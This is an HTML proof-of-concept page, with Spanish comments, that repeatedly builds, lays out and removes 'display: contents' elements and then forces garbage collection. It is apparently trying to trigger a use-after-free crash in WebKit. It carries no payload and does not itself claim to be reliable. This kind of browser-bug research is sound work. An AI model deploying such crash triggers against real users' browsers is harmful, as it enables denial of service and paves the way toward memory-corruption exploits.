<!DOCTYPE html>
<html>
<head>
  <title>WebKit UAF Crash PoC</title>
  <style>
    #target {
      display: contents;
    }
  </style>
</head>
<body>
  <div id="log">Running PoC...</div>
  <script>
    function log(msg) {
      document.getElementById('log').textContent += '\n' + msg;
    }

    function stressTest() {
      for (let i = 0; i < 10000; i++) {
        let outer = document.createElement("div");
        outer.id = "target";

        let inner = document.createElement("span");
        inner.textContent = "trigger";

        outer.appendChild(inner);
        document.body.appendChild(outer);

        // Forzar layout
        getComputedStyle(inner).color;

        // Intentar invalidar renderización
        outer.remove();
      }
      log("Finished spraying. Now attempting GC...");

      // Forzar GC si es posible
      try {
        if (window.gc) window.gc();
      } catch (e) {}

      log("PoC ejecutado. Observa si hay crash o cuelgue.");
    }

    setTimeout(stressTest, 1000);
  </script>
</body>
</html>
